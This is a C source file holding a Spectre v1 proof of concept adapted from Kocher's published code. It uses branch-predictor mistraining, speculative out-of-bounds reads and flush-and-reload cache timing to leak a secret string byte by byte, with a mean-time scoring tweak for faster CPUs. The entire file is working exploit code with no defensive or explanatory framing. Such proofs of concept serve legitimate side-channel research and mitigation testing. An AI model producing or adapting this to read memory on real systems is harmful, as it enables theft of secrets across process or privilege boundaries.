/* Spectre v1 PoC (Kocher) - robust scoring variant for high-freq CPUs.
 * Instead of a fixed cache-hit threshold, average the probe time per byte
 * over many tries and pick the byte with the lowest mean access time. */
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0;
void victim_function(size_t x){ if (x < array1_size) temp &= array2[array1[x]*512]; }

void readMemoryByte(size_t malicious_x, int TRIES, uint8_t out[2], double sc[2]){
  static double tsum[256]; static int tcnt[256];
  for(int i=0;i<256;i++){tsum[i]=0;tcnt[i]=0;}
  unsigned junk=0; register uint64_t t1,t2; volatile uint8_t*addr; size_t x,training_x;
  for(int tries=TRIES;tries>0;tries--){
    for(int i=0;i<256;i++) _mm_clflush(&array2[i*512]);
    training_x = tries % array1_size;
    for(int j=29;j>=0;j--){ _mm_clflush(&array1_size);
      for(volatile int z=0;z<100;z++){}
      x=((j%6)-1)&~0xFFFF; x=(x|(x>>16)); x=training_x^(x&(malicious_x^training_x));
      victim_function(x);
    }
    for(int i=0;i<256;i++){ int mix=((i*167)+13)&255;
      if(mix==array1[tries%array1_size]) continue; /* skip the trained value */
      addr=&array2[mix*512];
      t1=__rdtscp(&junk); junk=*addr; t2=__rdtscp(&junk)-t1;
      if(t2<1000){ tsum[mix]+=t2; tcnt[mix]++; }
    }
  }
  int best=-1,second=-1; double bestv=1e18,secv=1e18;
  for(int i=0;i<256;i++){ if(!tcnt[i])continue; double m=tsum[i]/tcnt[i];
    if(m<bestv){secv=bestv;second=best;bestv=m;best=i;}
    else if(m<secv){secv=m;second=i;} }
  out[0]=best; out[1]=second; sc[0]=bestv; sc[1]=secv; junk&=1; tsum[0]+=junk;
}
int main(int argc,char**argv){
  for(size_t i=0;i<sizeof(array2);i++) array2[i]=1;
  size_t malicious_x=(size_t)(secret-(char*)array1);
  int len = argc>1?atoi(argv[1]):40, TRIES=argc>2?atoi(argv[2]):1000;
  printf("Reading %d bytes (robust mean-time scoring, %d tries each):\n\n",len,TRIES);
  uint8_t v[2]; double sc[2]; char line[256]; int p=0;
  for(int n=0;n<len;n++){
    readMemoryByte(malicious_x+n,TRIES,v,sc);
    int ok = (sc[1]-sc[0] > 40); /* clear gap in mean cycles */
    printf("byte %2d: %s 0x%02X='%c'  mean=%.0f cyc (next 0x%02X=%.0f)\n",
      n, ok?"OK ":"?? ", v[0], (v[0]>31&&v[0]<127?v[0]:'?'), sc[0], v[1], sc[1]);
    line[p++]=(v[0]>31&&v[0]<127)?v[0]:'?';
  }
  line[p]=0; printf("\nRecovered: \"%s\"\n",line);
  return 0;
}
